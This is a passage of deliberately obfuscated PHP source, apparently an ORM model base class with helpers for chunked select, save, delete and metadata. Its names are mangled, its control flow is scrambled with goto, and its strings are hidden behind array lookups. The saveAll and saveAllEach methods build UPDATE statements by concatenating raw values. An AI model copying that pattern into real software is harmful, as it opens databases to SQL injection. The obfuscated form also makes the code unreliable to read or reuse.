$C‹ê“Ñìä[347] => $d£ğ‡õÚêñ, $C‹ê“Ñìä[360] => $cÍ‘¥…Ç¹§), $C‹ê“Ñìä[361] => $CÍÓ—Šßœ¯ ? $CÍÓ—Šßœ¯ : array()); return $eáÌ¯®›ª; goto dŠöÉÒ…Ô”; C¹×Ìæ¯Œ·: $fŠ¶°ÂÔÎ¬ = intval($this->count()); $b¡Ó³Üï“ƒ = intval($b¡Ó³Üï“ƒ); $b¡Ó³Üï“ƒ = $b¡Ó³Üï“ƒ <= 5 ? 5 : ($b¡Ó³Üï“ƒ >= $a‚âùğÆïÉ ? $a‚âùğÆïÉ : $b¡Ó³Üï“ƒ); goto B¯ø“»ÉÓÑ; c‚î¼®”ÊÄ: $a‚âùğÆïÉ = 4000; $b¡Ó³Üï“ƒ = isset($in[$C‹ê“Ñìä[356]]) ? $in[$C‹ê“Ñìä[356]] : $b¡Ó³Üï“ƒ; if ($b¡Ó³Üï“ƒ === -1) { unset($in[$C‹ê“Ñìä[356]]); $a‚âùğÆïÉ = 100000000; $b¡Ó³Üï“ƒ = $a‚âùğÆïÉ; } goto c¡áãß¬†ê; C‰‘ÕñôÌ: $this->optionsValue($cÕÑÚ¬†·); $CÍÓ—Šßœ¯ = $this->page($d£ğ‡õÚêñ, $b¡Ó³Üï“ƒ)->select(); $CÍÓ—Šßœ¯ = is_array($CÍÓ—Šßœ¯) ? $CÍÓ—Šßœ¯ : array(); goto e¦ˆ»”·â; dŠöÉÒ…Ô”: } protected function checkLength($DÄ¾ïáğ‚£, $F†‹õï½±‡ = 0, $fè—ËÎ•˜ = '') { $fÕ¢ãĞõ‘Ï =& $_SERVER[úÎü]; $F†‹õï½±‡ = $F†‹õï½±‡ ? $F†‹õï½±‡ : 65536; if (!$DÄ¾ïáğ‚£ || strlen($DÄ¾ïáğ‚£) < $F†‹õï½±‡) { return; } $fè—ËÎ•˜ = $fè—ËÎ•˜ ? $fè—ËÎ•˜ . $fÕ¢ãĞõ‘Ï[67] : $fÕ¢ãĞõ‘Ï[33]; show_json($fè—ËÎ•˜ . LNG($fÕ¢ãĞõ‘Ï[362]) . "\50{$F†‹õï½±‡}\51", !1); } protected function metaSet($D·Ë÷†—ãÊ, $C³‘µœó = null, $eñŒŸö™ã = null) { goto F†¡“˜Ê±£; fŠäè¨ÈÜ: $d¨¾ïñ‘Ê’ = $this->tableMeta[$döºà°è‹[364]]; $Fáˆ¶êÃÀ = Model($d¨¾ïñ‘Ê’); $dôå »•º = array($b¿£âÑÕØ => $D·Ë÷†—ãÊ, $döºà°è‹[365] => $C³‘µœó); goto cæ´°òğÍ; dµ÷«„„›­: if (is_string($C³‘µœó)) { $aùÏ•˜İÁƒ[$C³‘µœó] = $eñŒŸö™ã; } $eÂô×“ßåÀ = array(); foreach ($aùÏ•˜İÁƒ as $aíÜÁ÷”ÏÃ => $a“â¶À«) { $this->checkLength($a“â¶À«, !1, $d¨¾ïñ‘Ê’ . $döºà°è‹[4] . $aíÜÁ÷”ÏÃ); $eÂô×“ßåÀ[] = array($b¿£âÑÕØ => $D·Ë÷†—ãÊ, $döºà°è‹[89] => $aíÜÁ÷”ÏÃ, $döºà°è‹[366] => $a“â¶À«); } goto A‡Š‡Ø¾‚°; A‡Š‡Ø¾‚°: $Fáˆ¶êÃÀ->where(array($b¿£âÑÕØ => $D·Ë÷†—ãÊ))->addAll($eÂô×“ßåÀ, array(), !0); return !0; goto dÓîÂªÎª; cæ´°òğÍ: if (is_null($C³‘µœó)) { return $Fáˆ¶êÃÀ->where(array($b¿£âÑÕØ => $D·Ë÷†—ãÊ))->delete(); } if (is_null($eñŒŸö™ã) && is_string($C³‘µœó)) { return $Fáˆ¶êÃÀ->where($dôå »•º)->delete(); } $aùÏ•˜İÁƒ = is_array($C³‘µœó) ? $C³‘µœó : array(); goto dµ÷«„„›­; F†¡“˜Ê±£: $döºà°è‹ =& $_SERVER[úÎü]; if (!$this->tableMeta || !$D·Ë÷†—ãÊ) { return !1; } $b¿£âÑÕØ = $this->tableMeta[$döºà°è‹[363]]; goto fŠäè¨ÈÜ; dÓîÂªÎª: } public function metaGet($F‰‡›Ø–‡·, $AË«¥è†Íì = false) { goto BÎ¨ëŒÇèÑ; Eìò°å¦ÌØ: $Aò¤ª×Ë«Ñ = Model($this->tableMeta[$B‰›ãİ[364]]); if ($AË«¥è†Íì) { $dë»‹Íë›ñ = array($Dæ™ˆ‹ø¼† => $F‰‡›Ø–‡·, $B‰›ãİ[89] => $AË«¥è†Íì); return $Aò¤ª×Ë«Ñ->where($dë»‹Íë›ñ)->getField($B‰›ãİ[366]); } $dë»‹Íë›ñ = array($Dæ™ˆ‹ø¼† => $F‰‡›Ø–‡·); goto c÷õ¡…Œâ; BÎ¨ëŒÇèÑ: $B‰›ãİ =& $_SERVER[úÎü]; if (!$this->tableMeta) { return array(); } $Dæ™ˆ‹ø¼† = $this->tableMeta[$B‰›ãİ[363]]; goto Eìò°å¦ÌØ; c÷õ¡…Œâ: $dÙÄ³á¦‰ä = $Aò¤ª×Ë«Ñ->field($B‰›ãİ[367])->where($dë»‹Íë›ñ)->select(); $dÙÄ³á¦‰ä = array_to_keyvalue($dÙÄ³á¦‰ä, $B‰›ãİ[89], $B‰›ãİ[366]); return $dÙÄ³á¦‰ä; goto bÀÄÈšÏó‹; bÀÄÈšÏó‹: } private function checkDataAutoHas($CÛéŠïÓ¥Ñ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $eÂâÍøÉÂé) { if (in_array($CÛéŠïÓ¥Ñ, explode($_SERVER[úÎü][47], $eÂâÍøÉÂé[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$e©®ø¼«Ÿì, $FìƒŠ×Ù­¯) { $e÷è™´ÆÃÈ =& $_SERVER[úÎü]; foreach ($this->dataAuto as $cÑáõ£‰÷Ô) { $A²®÷ÓŒ¹ = $cÑáõ£‰÷Ô[0]; if (!in_array($FìƒŠ×Ù­¯, explode($e÷è™´ÆÃÈ[47], $cÑáõ£‰÷Ô[2]))) { continue; } switch (trim($cÑáõ£‰÷Ô[3])) { case $e÷è™´ÆÃÈ[315]: case $e÷è™´ÆÃÈ[316]: $c¶‰·åéÈ = $cÑáõ£‰÷Ô[1]; $d³‹««Àğ = isset($cÑáõ£‰÷Ô[4]) ? (array) $cÑáõ£‰÷Ô[4] : array(); if ($c¶‰·åéÈ == $e÷è™´ÆÃÈ[193] && array_key_exists($A²®÷ÓŒ¹, $e©®ø¼«Ÿì)) { if (!$e©®ø¼«Ÿì[$A²®÷ÓŒ¹]) { unset($e©®ø¼«Ÿì[$A²®÷ÓŒ¹]); } break; } if (isset($e©®ø¼«Ÿì[$A²®÷ÓŒ¹])) { array_unshift($d³‹««Àğ, $e©®ø¼«Ÿì[$A²®÷ÓŒ¹]); } if ($e÷è™´ÆÃÈ[315] == $cÑáõ£‰÷Ô[3]) { $e©®ø¼«Ÿì[$A²®÷ÓŒ¹] = call_user_func_array($c¶‰·åéÈ, $d³‹««Àğ); } else { $e©®ø¼«Ÿì[$A²®÷ÓŒ¹] = call_user_func_array(array(&$this, $c¶‰·åéÈ), $d³‹««Àğ); } break; case $e÷è™´ÆÃÈ[267]: $e©®ø¼«Ÿì[$A²®÷ÓŒ¹] = $e©®ø¼«Ÿì[$cÑáõ£‰÷Ô[1]]; break; case $e÷è™´ÆÃÈ[288]: if (isset($e©®ø¼«Ÿì[$A²®÷ÓŒ¹]) && !is_string($e©®ø¼«Ÿì[$A²®÷ÓŒ¹])) { $e©®ø¼«Ÿì[$A²®÷ÓŒ¹] = json_encode_force($e©®ø¼«Ÿì[$A²®÷ÓŒ¹]); } break; case $e÷è™´ÆÃÈ[317]: if ($e©®ø¼«Ÿì[$A²®÷ÓŒ¹] === $e÷è™´ÆÃÈ[33]) { unset($e©®ø¼«Ÿì[$A²®÷ÓŒ¹]); } break; case $e÷è™´ÆÃÈ[318]: $e©®ø¼«Ÿì[$A²®÷ÓŒ¹] = $cÑáõ£‰÷Ô[1]; default: break; } } if ($FìƒŠ×Ù­¯ == $e÷è™´ÆÃÈ[351]) { $c×…Š‘¡¤š = strtolower($this->db->getDbType()); if (strpos($c×…Š‘¡¤š, $e÷è™´ÆÃÈ[9]) !== 0) { return; } $bç¤ÀÀ = $this->field(!0)->fields; $cë“‹ÛÉôÌ = $bç¤ÀÀ[$e÷è™´ÆÃÈ[246]]; if (isset($bç¤ÀÀ[$e÷è™´ÆÃÈ[245]])) { unset($cë“‹ÛÉôÌ[$bç¤ÀÀ[$e÷è™´ÆÃÈ[245]]]); } foreach ($cë“‹ÛÉôÌ as $bæšã²”µˆ => $FìƒŠ×Ù­¯) { if (!isset($e©®ø¼«Ÿì[$bæšã²”µˆ])) { $e©®ø¼«Ÿì[$bæšã²”µˆ] = $e÷è™´ÆÃÈ[33]; } } } } private function dataAfterFilter(&$eíöµ”ù¤Ÿ) { $a‹ •‰Ï° =& $_SERVER[úÎü]; foreach ($this->dataAuto as $E‘œ’ïŞœ) { $A“¶šï¢Ë = $E‘œ’ïŞœ[0]; if (!in_array($a‹ •‰Ï°[353], explode($a‹ •‰Ï°[47], $E‘œ’ïŞœ[2]))) { continue; } if (!isset($eíöµ”ù¤Ÿ[$A“¶šï¢Ë])) { continue; } switch (trim($E‘œ’ïŞœ[3])) { case $a‹ •‰Ï°[315]: case $a‹ •‰Ï°[316]: $BöˆÄÌ­– = isset($E‘œ’ïŞœ[4]) ? (array) $E‘œ’ïŞœ[4] : array(); array_unshift($BöˆÄÌ­–, $eíöµ”ù¤Ÿ[$A“¶šï¢Ë]); if ($a‹ •‰Ï°[315] == $E‘œ’ïŞœ[3]) { $eíöµ”ù¤Ÿ[$A“¶šï¢Ë] = call_user_func_array($E‘œ’ïŞœ[1], $BöˆÄÌ­–); } else { $eíöµ”ù¤Ÿ[$A“¶šï¢Ë] = call_user_func_array(array(&$this, $E‘œ’ïŞœ[1]), $BöˆÄÌ­–); } break; case $a‹ •‰Ï°[267]: $eíöµ”ù¤Ÿ[$A“¶šï¢Ë] = $eíöµ”ù¤Ÿ[$E‘œ’ïŞœ[1]]; break; case $a‹ •‰Ï°[288]: $A¦¾“õ‘š¨ = $eíöµ”ù¤Ÿ[$A“¶šï¢Ë]; $eíöµ”ù¤Ÿ[$A“¶šï¢Ë] = json_decode($A¦¾“õ‘š¨, !0); if (is_null($eíöµ”ù¤Ÿ[$A“¶šï¢Ë])) { $eíöµ”ù¤Ÿ[$A“¶šï¢Ë] = $A¦¾“õ‘š¨; } break; case $a‹ •‰Ï°[317]: if ($eíöµ”ù¤Ÿ[$A“¶šï¢Ë] === $a‹ •‰Ï°[33]) { unset($eíöµ”ù¤Ÿ[$A“¶šï¢Ë]); } break; case $a‹ •‰Ï°[318]: $eíöµ”ù¤Ÿ[$A“¶šï¢Ë] = $E‘œ’ïŞœ[1]; default: break; } } } public function saveAll($EÊ¯©©Ü×ª) { goto AÎß¥º¦Æƒ; Bæä†æÏÖÖ: $eåóÆ‡ÊÕ = array(); $Eó–†­¨Æ = count($EÊ¯©©Ü×ª); for ($dÎÉŞæ™Ş´ = 0; $dÎÉŞæ™Ş´ < $Eó–†­¨Æ; $dÎÉŞæ™Ş´++) { $D–öÒëà = $EÊ¯©©Ü×ª[$dÎÉŞæ™Ş´]; if (!is_array($D–öÒëà) || count($D–öÒëà) != 4) { continue; } $fÜšŞµ‚¯‹ = "\125\x50\x44\101\124\x45\x20\140{$eª„¸—ª½©}\140\x20\123\105\x54\40{$D–öÒëà[2]}\40\x3d\40\103\x41\x53\105\40{$D–öÒëà[0]}\40\12"; if ($F½’¯Îƒ¤ç == 0) { $bµ¬‰©·Æ = $fÜšŞµ‚¯‹; } $eåóÆ‡ÊÕ[] = $b¸š¯Ê“è[113] . $D–öÒëà[1] . $b¸š¯Ê“è[113]; $F½’¯Îƒ¤ç++; $bµ¬‰©·Æ .= "\x20\x57\110\105\x4e\x20\x27{$D–öÒëà[1]}\47\x20\124\x48\x45\116\40\47{$D–öÒëà[3]}\x27\x20\xa"; if ($F½’¯Îƒ¤ç == $Cæôá„é¬¢ || $dÎÉŞæ™Ş´ == $Eó–†­¨Æ - 1) { goto eò‰ù¢ïÄ²; eò‰ù¢ïÄ²: $b“ÕÏ¤ìƒ× = implode($b¸š¯Ê“è[47], $eåóÆ‡ÊÕ); $bµ¬‰©·Æ .= "\x20\x45\116\x44\40\x20\x57\110\105\122\105\x20{$D–öÒëà[0]}\x20\x49\116\x20\50{$b“ÕÏ¤ìƒ×}\51\x20"; $this->execute($bµ¬‰©·Æ); goto e®·ù»‹ğÌ; e®·ù»‹ğÌ: $F½’¯Îƒ¤ç = 0; $bµ¬‰©·Æ = $fÜšŞµ‚¯‹; $this->chunkEventCheck(count($eåóÆ‡ÊÕ)); goto A†Õ°†; A†Õ°†: $eåóÆ‡ÊÕ = array(); goto B—†ßà‡Ò; B—†ßà‡Ò: } } goto AµÒÈ³ÈÈá; f¸óæ³ÁÂ: $EÊ¯©©Ü×ª = is_array($EÊ¯©©Ü×ª) ? $EÊ¯©©Ü×ª : array(); $bµ¬‰©·Æ = $b¸š¯Ê“è[368]; $F½’¯Îƒ¤ç = 0; goto Bæä†æÏÖÖ; AµÒÈ³ÈÈá: $this->chunkEventSet(); goto b¸åÉ†ğËÀ; AÎß¥º¦Æƒ: $b¸š¯Ê“è =& $_SERVER[úÎü]; $eª„¸—ª½© = $this->tablePrefix . $this->tableName; $Cæôá„é¬¢ = self::SQL_WHERE_IN_CHUNK; goto f¸óæ³ÁÂ; b¸åÉ†ğËÀ: } public function saveAllEach($eóá‹Ä©ËÎ) { $D–Â¾§ç›Â =& $_SERVER[úÎü]; $CÀªöÏ ““ = $this->tablePrefix . $this->tableName; foreach ($eóá‹Ä©ËÎ as $b—’óïô˜) { if (!is_array($b—’óïô˜) || count($b—’óïô˜) != 4) { continue; } $Aø „¦Íô· = $b—’óïô˜[0] . $D–Â¾§ç›Â[369] . $b—’óïô˜[1] . $D–Â¾§ç›Â[113]; $CˆŠ®ÓƒÌ– = $b—’óïô˜[2] . $D–Â¾§ç›Â[369] . $b—’óïô˜[3] . $D–Â¾§ç›Â[113]; $E³³ÏÀ½ğ‚ = "\165\x70\144\141\x74\145\40{$CÀªöÏ ““}\40\x73\x65\x74\40{$CˆŠ®ÓƒÌ–}\40\x77\x68\145\x72\x65\x20{$Aø „¦Íô·}\x3b"; $this->execute($E³³ÏÀ½ğ‚); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($AìÄìñ¾¬í = false, $F»ˆ›‹ô¬ = false) { $this->_chunkEvent = $AìÄìñ¾¬í; $this->_chunkEventParam = $F»ˆ›‹ô¬; } private function chunkEventCheck($fÎ©³—ó) { if (!$this->_chunkEvent) { return; } $F‰¼øÓª±‰ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $F‰¼øÓª±‰[$_SERVER[úÎü][370]] = $fÎ©³—ó; Hook::trigger($this->_chunkEvent, $F‰¼øÓª±‰); } public function addAll($Få¸‚¶ìŠ, $aœä‹®Ş = array(), $c‹ÖÀì£‹ = false) { goto Aè‘ßÜ²­; B¶½°èËÂ: if (method_exists($this->db, $AÕİæáß‰Á[266])) { for ($FâØïã’óé = 0; $FâØïã’óé < count($Få¸‚¶ìŠ); $FâØïã’óé += $E¢¤ŠÒºÓ) { $BÃññØ¥³İ = array_slice($Få¸‚¶ìŠ, $FâØïã’óé, $E¢¤ŠÒºÓ); if (!is_array($BÃññØ¥³İ) || count($BÃññØ¥³İ) == 0) { break; } $Cêµ„‚”ù± = $this->db->insertAll($BÃññØ¥³İ, $aœä‹®Ş, $c‹ÖÀì£‹); $this->chunkEventCheck(count($BÃññØ¥³İ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Få¸‚¶ìŠ as $bÉ™×ªó¦ª => $Cí¼ï¨¦ÜÍ) { $Cêµ„‚”ù± = $this->db->insert($Cí¼ï¨¦ÜÍ, $aœä‹®Ş, $c‹ÖÀì£‹); } $this->commit(); } if (!1 !== $Cêµ„‚”ù±) { $Aõ‚­‘Ç±® = $this->getLastInsID(); if ($Aõ‚­‘Ç±®) { return $Aõ‚­‘Ç±®; } } return $Cêµ„‚”ù±; goto A¾¯›Ú‘Ğà; Aè‘ßÜ²­: $AÕİæáß‰Á =& $_SERVER[úÎü]; ignore_timeout(); $E¢¤ŠÒºÓ = self::SQL_WHERE_IN_CHUNK; goto b£™›ÂÑ»; b£™›ÂÑ»: if (empty($Få¸‚¶ìŠ)) { $this->error = think_lang($AÕİæáß‰Á[265]); return !1; } $aœä‹®Ş = $this->_parseOptions($aœä‹®Ş); foreach ($Få¸‚¶ìŠ as $bÉ™×ªó¦ª => $Cí¼ï¨¦ÜÍ) { $Få¸‚¶ìŠ[$bÉ™×ªó¦ª] = $this->_facade($Cí¼ï¨¦ÜÍ); $this->_beforeInsert($Få¸‚¶ìŠ[$bÉ™×ªó¦ª], $aœä‹®Ş); } goto B¶½°èËÂ; A¾¯›Ú‘Ğà: } public function save($e“šî“òë = '', $dïÒÙ÷ÔÎ® = array()) { goto eŠ¥‘†İíñ; C’éõ­æÖ¦: for ($c¼‰‡§¨½¨ = 0; $c¼‰‡§¨½¨ < $Cà¦ôÁîîà; $c¼‰‡§¨½¨ += $a¸âÊÙ£) { $D„‹Ä©æ¨ô = array_slice($C¾×ÉªÌµ¯, $c¼‰‡§¨½¨, $a¸âÊÙ£); if (!is_array($D„‹Ä©æ¨ô) || count($D„‹Ä©æ¨ô) == 0) { break; } $DñîÛÄ¦Í¤[$f’à“‘˜Ô[269]][$dîÌÀ‚ÛÒÚ][1] = $D„‹Ä©æ¨ô; $this->optionsValue($DñîÛÄ¦Í¤); $D“Ş½‹çš’ += parent::save($e“šî“òë, $dïÒÙ÷ÔÎ®); $this->chunkEventCheck(count($D„‹Ä©æ¨ô)); } $this->chunkEventSet(); return $D“Ş½‹çš’; goto C†ëˆ»õ–; BÎØ¶İÓÈ¯: $C¾×ÉªÌµ¯ = $DñîÛÄ¦Í¤[$f’à“‘˜Ô[269]][$dîÌÀ‚ÛÒÚ][1]; $C¾×ÉªÌµ¯ = is_array($C¾×ÉªÌµ¯) ? $C¾×ÉªÌµ¯ : array(); $Cà¦ôÁîîà = count($C¾×ÉªÌµ¯); goto C’éõ­æÖ¦; eŠ¥‘†İíñ: $f’à“‘˜Ô =& $_SERVER[úÎü]; $a¸âÊÙ£ = self::SQL_WHERE_IN_CHUNK; $DñîÛÄ¦Í¤ = $this->optionsValue(); goto Bòæã¦¯; Bòæã¦¯: $dîÌÀ‚ÛÒÚ = $this->findWhereField($DñîÛÄ¦Í¤); if (!$dîÌÀ‚ÛÒÚ) { return parent::save($e“šî“òë, $dïÒÙ÷ÔÎ®); } $D“Ş½‹çš’ = 0; goto BÎØ¶İÓÈ¯; C†ëˆ»õ–: } public function add($AÓâó…àï = '', $dÁÙğ³¼¡ = array(), $eÄ°œçÕÕù = false) { if ($this->addTaskStatus && is_array($AÓâó…àï)) { $this->addTaskData[] = $AÓâó…àï; return; } return parent::add($AÓâó…àï, $dÁÙğ³¼¡, $eÄ°œçÕÕù); } public function parseWhereLike($e¬„¹ÇåÓ’, $E£Ÿ‰›í§Ã = '', $F«á³õœÛº = false, &$bØÂĞ‹µòë = false) { goto dØ–‹ÄÅÚõ; dØ–‹ÄÅÚõ: $C‰ª¬¼Úæ¹ =& $_SERVER[úÎü]; $F«·ößÚ‰‹ = $GLOBALS[$C‰ª¬¼Úæ¹[6]][$C‰ª¬¼Úæ¹[371]]; if (!$F«·ößÚ‰‹[$C‰ª¬¼Úæ¹[372]]) { return $e¬„¹ÇåÓ’; } goto DÜæ›•‰òø; DÜæ›•‰òø: if (!is_array($e¬„¹ÇåÓ’)) { return $e¬„¹ÇåÓ’; } $Aë‰Ã² ­ = array(); $A„Í’«Û¨š = 0; goto D¬‹ÒÑãˆÔ; D¬‹ÒÑãˆÔ: foreach ($e¬„¹ÇåÓ’ as $FùĞ‹Ù¬âƒ => $E·»®ã“Ğó) { if (is_array($E·»®ã“Ğó) && count($E·»®ã“Ğó) == 2 && $E·»®ã“Ğó[0] == $C‰ª¬¼Úæ¹[373] && is_string($E·»®ã“Ğó[1]) && substr($E·»®ã“Ğó[1], 0, 1) == $C‰ª¬¼Úæ¹[374] && substr($E·»®ã“Ğó[1], strlen($E·»®ã“Ğó[1]) - 1, 1) == $C‰ª¬¼Úæ¹[374]) { goto Cù‡¯¼Ë¦; AÑ¦‹òàŒ: $Aë‰Ã² ­[$A„Í’«Û¨š] = $C‰ª¬¼Úæ¹[377] . $Eâß¿¡©ï . $C‰ª¬¼Úæ¹[378] . $D¯â½¨ß­ . $C‰ª¬¼Úæ¹[379]; $A„Í’«Û¨š++; continue; goto A¦â»ÆºŠ; bÇÇŠ˜Îåî: $D¯â½¨ß­ = $this->db->escapeString($D¯â½¨ß­); if (!strpos($Eâß¿¡©ï, $C‰ª¬¼Úæ¹[91])) { $Eâß¿¡©ï = $C‰ª¬¼Úæ¹[375] . $Eâß¿¡©ï . $C‰ª¬¼Úæ¹[375]; } if ($F«·ößÚ‰‹[$C‰ª¬¼Úæ¹[376]]) { $D¯â½¨ß­ = $C‰ª¬¼Úæ¹[113] . $D¯â½¨ß­ . $C‰ª¬¼Úæ¹[113]; } goto AÑ¦‹òàŒ; Cù‡¯¼Ë¦: $bØÂĞ‹µòë = !0; $Eâß¿¡©ï = is_string($FùĞ‹Ù¬âƒ) ? $FùĞ‹Ù¬âƒ : $E£Ÿ‰›í§Ã; $D¯â½¨ß­ = substr($E·»®ã“Ğó[1], 1, strlen($E·»®ã“Ğó[1]) - 2); goto bÇÇŠ˜Îåî; A¦â»ÆºŠ: } if (is_array($E·»®ã“Ğó)) { $E£Ÿ‰›í§Ã = is_string($FùĞ‹Ù¬âƒ) ? $FùĞ‹Ù¬âƒ : $E£Ÿ‰›í§Ã; $E·»®ã“Ğó = $this->parseWhereLike($E·»®ã“Ğó, $E£Ÿ‰›í§Ã, !0, $bØÂĞ‹µòë); } if (is_numeric($FùĞ‹Ù¬âƒ)) { $Aë‰Ã² ­[$A„Í’«Û¨š] = $E·»®ã“Ğó; $A„Í’«Û¨š++; } else { $Aë‰Ã² ­[$FùĞ‹Ù¬âƒ] = $E·»®ã“Ğó; } } if ($bØÂĞ‹µòë && !$F«á³õœÛº) { trace_log(array($Aë‰Ã² ­, $e¬„¹ÇåÓ’), $C‰ª¬¼Úæ¹[269]); } return $Aë‰Ã² ­; goto DÖÜ”†÷„ó; DÖÜ”†÷„ó: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($e¼Ê¼¦Ø¹Ç = array()) { goto C—Œé¸¥‰Ó; F‘†Ï„Û”: return $A‚¹¶ù†¡–; goto fæÅÀÅÄÈš; BÒĞ³£äà: $aÂ‘¥ˆÈ©³ = $this->findWhereField($DƒÁãÅÈê); if (!$aÂ‘¥ˆÈ©³ || isset($DƒÁãÅÈê[$fè¡Èò‹[286]]) || isset($DƒÁãÅÈê[$fè¡Èò‹[347]])) { return parent::select($e¼Ê¼¦Ø¹Ç); } $Eßö©ªó§ö = $DƒÁãÅÈê[$fè¡Èò‹[269]][$aÂ‘¥ˆÈ©³][1]; goto b…°ëˆ™¶½; b…°ëˆ™¶½: $Eßö©ªó§ö = is_array($Eßö©ªó§ö) ? $Eßö©ªó§ö : array(); $A‚¹¶ù†¡– = null; for ($CÏ’ØÙÁæÎ = 0; $CÏ’ØÙÁæÎ < count($Eßö©ªó§ö); $CÏ’ØÙÁæÎ += $D‹¤¤íÇä) { $eÌÒˆ¿¢ ˆ = array_slice($Eßö©ªó§ö, $CÏ’ØÙÁæÎ, $D‹¤¤íÇä); if (!is_array($eÌÒˆ¿¢ ˆ) || count($eÌÒˆ¿¢ ˆ) == 0) { break; } $DƒÁãÅÈê[$fè¡Èò‹[269]][$aÂ‘¥ˆÈ©³][1] = $eÌÒˆ¿¢ ˆ; $this->optionsValue($DƒÁãÅÈê); $B§Ş¶ŒŞ½Â = parent::select($e¼Ê¼¦Ø¹Ç); if (!$B§Ş¶ŒŞ½Â) { continue; } if (is_null($A‚¹¶ù†¡–)) { $A‚¹¶ù†¡– = array(); } $A‚¹¶ù†¡– = array_merge($A‚¹¶ù†¡–, $B§Ş¶ŒŞ½Â); } goto F‘†Ï„Û”; C—Œé¸¥‰Ó: $fè¡Èò‹ =& $_SERVER[úÎü]; $D‹¤¤íÇä = self::SQL_WHERE_IN_CHUNK; $DƒÁãÅÈê = $this->optionsValue(); goto BÒĞ³£äà; fæÅÀÅÄÈš: } public function delete($bÃÄƒÈ™ÎÔ = array()) { goto d“›èÀ¬; d“›èÀ¬: $BßİŠß²©§ =& $_SERVER[úÎü]; $DÒˆÑãÖ°’ = self::SQL_WHERE_IN_CHUNK; $dœ™ÂÔæ = $this->optionsValue(); goto f»Í˜“‰¤¿; EÑš‹½ˆÏ¶: $bÁØåÉãÎ = $dœ™ÂÔæ[$BßİŠß²©§[269]][$få‡©¸Ş][1]; $bÁØåÉãÎ = is_array($bÁØåÉãÎ) ? $bÁØåÉãÎ : array(); for ($f…Ôí¸ŒŸÛ = 0; $f…Ôí¸ŒŸÛ < count($bÁØåÉãÎ); $f…Ôí¸ŒŸÛ += $DÒˆÑãÖ°’) { $DèŞÄÚåï = array_slice($bÁØåÉãÎ, $f…Ôí¸ŒŸÛ, $DÒˆÑãÖ°’); if (!is_array($DèŞÄÚåï) || count($DèŞÄÚåï) == 0) { break; } $dœ™ÂÔæ[$BßİŠß²©§[269]][$få‡©¸Ş][1] = $DèŞÄÚåï; $this->optionsValue($dœ™ÂÔæ); $D‚•Ïö¼àî += parent::delete($bÃÄƒÈ™ÎÔ); } goto f›Ì°°îğ³; f»Í˜“‰¤¿: $få‡©¸Ş = $this->findWhereField($dœ™ÂÔæ); if (!$få‡©¸Ş) { return parent::delete($bÃÄƒÈ™ÎÔ); } $D‚•Ïö¼àî = 0; goto EÑš‹½ˆÏ¶; f›Ì°°îğ³: return $D‚•Ïö¼àî; goto bëÎã‰„Ğê; bëÎã‰„Ğê: } private function findWhereField($A³¢¨ø½¼) { $BÆ¤——…³ =& $_SERVER[úÎü]; $eİº®®¡˜¼ = self::SQL_WHERE_IN_CHUNK; if (!is_array($A³¢¨ø½¼) || !is_array($A³¢¨ø½¼[$BÆ¤——…³[269]])) { return !1; } foreach ($A³¢¨ø½¼[$BÆ¤——…³[269]] as $dƒ„Ã¦ÃîÈ => $F‘É…Ê—·‡) { if (is_array($F‘É…Ê—·‡) && isset($F‘É…Ê—·‡[0]) && is_string($F‘É…Ê—·‡[0]) && strtolower($F‘É…Ê—·‡[0]) == $BÆ¤——…³[7] && is_array($F‘É…Ê—·‡[1]) && count($F‘É…Ê—·‡[1]) > $eİº®®¡˜¼) { ignore_timeout(); return $dƒ„Ã¦ÃîÈ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\164\145\x6d\117\x70\164\151\157\x6e"; public $field = array(); public function listData($b¶´ìÕØÜï = false, $A½Ê­§·è = "\155\x6f\144\x69\146\x79\124\x69\155\x65", $F¸Ù×í×˜” = false) { $FéÄ™Û“æÆ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$FéÄ™Û“æÆ) { return $b¶´ìÕØÜï ? null : array(); } if (!$b¶´ìÕØÜï) { $FéÄ™Û“æÆ = array_filter(array_values($FéÄ™Û“æÆ)); return array_sort_by($FéÄ™Û“æÆ, $A½Ê­§·è, $F¸Ù×í×˜”); } return $FéÄ™Û“æÆ[$_SERVER[úÎü][380] . $b¶´ìÕØÜï]; } public function insert($BÓµº™„•â) { goto aÉî‰Õ¤¦™; aÉî‰Õ¤¦™: $Aƒ½îç ìÀ =& $_SERVER[úÎü]; $BÓµº™„•â = array_field_key($BÓµº™„•â, $this->field); $fòÏ¸ÍÒ®… = Model($this->modelType)->get($Aƒ½îç ìÀ[381], $this->optionType . $Aƒ½îç ìÀ[382]); goto aß©¼ÓÑ»; aæø™´â²‚: $BÓµº™„•â[$Aƒ½îç ìÀ[107]] = time(); Model($this->modelType)->set($Aƒ½îç ìÀ[381], $fòÏ¸ÍÒ®…, $this->optionType . $Aƒ½îç ìÀ[382]); Model($this->modelType)->set($Aƒ½îç ìÀ[380] . $fòÏ¸ÍÒ®…, $BÓµº™„•â, $this->optionType); goto d›ˆé‡§å¢; d›ˆé‡§å¢: return $fòÏ¸ÍÒ®…; goto E”·õ±áé; aß©¼ÓÑ»: $fòÏ¸ÍÒ®… = $fòÏ¸ÍÒ®… ? $fòÏ¸ÍÒ®… : 0; $BÓµº™„•â[$Aƒ½îç ìÀ[383]] = ++$fòÏ¸ÍÒ®…; $BÓµº™„•â[$Aƒ½îç ìÀ[190]] = time(); goto aæø™´â²‚; E”·õ±áé: } public function update($eñğÌÓ¸âç, $AÂ†âöÜš) { goto FÚ²ÓíŠâ; Bƒ¢³Ğ¬¡¹: return Model($this->modelType)->set($dÀ©¨§ƒÊô[380] . $eñğÌÓ¸âç, $AÂ†âöÜš, $this->optionType); goto aÔÏŒ®µ«; FÚ²ÓíŠâ: $dÀ©¨§ƒÊô =& $_SERVER[úÎü]; $AÂ†âöÜš = array_field_key($AÂ†âöÜš, $this->field); $C”Ë®—Ó = $this->listData($eñğÌÓ¸âç); goto F“ùå®›¥Ó; F“ùå®›¥Ó: if (!$C”Ë®—Ó) { return !1; } $AÂ†âöÜš = 